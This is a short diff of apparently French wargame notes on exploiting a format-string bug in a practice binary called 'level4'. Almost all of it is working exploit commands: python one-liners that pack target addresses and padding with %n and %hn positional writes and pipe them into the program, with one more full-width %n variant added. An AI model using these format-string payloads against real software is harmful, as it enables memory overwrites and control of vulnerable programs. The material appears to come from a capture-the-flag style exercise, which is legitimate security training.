@@ -66,5 +66,8 @@ Ecrire en plusieurs parties avec %hn ? (write short 2 bytes)
 
 r < <(python -c 'print "\x12\x98\x04\x08" + "\x10\x98\x04\x08" + "%250d" + "%12$hn" + "%21570d" + "%13$hn"')
 
+(python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' ; cat) | ./level4
+
 
 (python -c 'print "\x12\x98\x04\x08" + "\x10\x98\x04\x08" + "%250d" + "%12$hn" + "%21570d" + "%13$hn"'; cat) | ./level4
+
